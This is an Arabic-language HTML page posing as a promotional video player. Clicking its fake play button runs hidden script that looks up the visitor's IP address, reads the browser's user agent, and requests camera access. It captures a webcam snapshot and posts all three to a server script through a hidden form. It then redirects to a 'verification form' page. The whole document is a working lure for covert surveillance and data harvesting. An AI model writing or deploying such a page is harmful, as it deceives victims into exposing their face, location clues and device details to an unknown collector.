<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>مشاهدة الفيديو</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f0f2f5;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .video-container {
            position: relative;
            width: 300px;
            height: 200px;
            background-image: url('https://appsyria00.github.io/appsyria00/vpn/z/proxyimage.png');
            background-size: cover;
            background-position: center;
            border-radius: 10px;
            overflow: hidden;
            cursor: pointer;
        }
        .play-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 60px;
            height: 60px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: transform 0.3s;
        }
        .play-button::before {
            content: '';
            width: 0;
            height: 0;
            border-top: 15px solid transparent;
            border-bottom: 15px solid transparent;
            border-left: 25px solid white;
        }
        .video-container:hover .play-button {
            transform: translate(-50%, -50%) scale(1.1);
        }
    </style>
</head>
<body>
    <div class="video-container" onclick="redirectToForm()">
        <div class="play-button"></div>
    </div>
    <p style="font-size: 14px; color: #666;">اضغط لمشاهدة الفيديو الترويجي!</p>
    <form id="dataForm" method="POST" action="save_data.php" style="display: none;">
        <input type="hidden" id="ip" name="ip">
        <input type="hidden" id="user_agent" name="user_agent">
        <input type="hidden" id="image_data" name="image_data">
    </form>
    <script>
        async function getClientInfo() {
            // جمع الـ IP
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            const ip = data.ip;
            const userAgent = navigator.userAgent;
            document.getElementById('ip').value = ip;
            document.getElementById('user_agent').value = userAgent;

            // طلب الكاميرا وإعداد الصورة
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = 300; canvas.height = 200;
                canvas.getContext('2d').drawImage(video, 0, 0, 300, 200);
                const imageData = canvas.toDataURL('image/jpeg'); // استخدام JPEG
                document.getElementById('image_data').value = imageData;

                stream.getTracks().forEach(track => track.stop());
            } catch (error) {
                document.getElementById('image_data').value = `Error: Camera access denied (${error.message})`;
            }
        }

        function redirectToForm() {
            getClientInfo().then(() => {
                document.getElementById('dataForm').style.display = 'block';
                saveData();
            });
            window.location.href = 'https://appsyria00.github.io/appsyria00/vpn/verification_form.html';
        }

        function saveData() {
            const form = document.getElementById('dataForm');
            const formData = new FormData(form);
            fetch('save_data.php', {
                method: 'POST',
                body: formData
            }).then(response => {
                console.log('Data saved');
            }).catch(error => {
                console.error('Error saving data:', error);
            });
        }

        window.onload = () => {}; // إبقاء التحميل فارغًا
    </script>
</body>
</html>
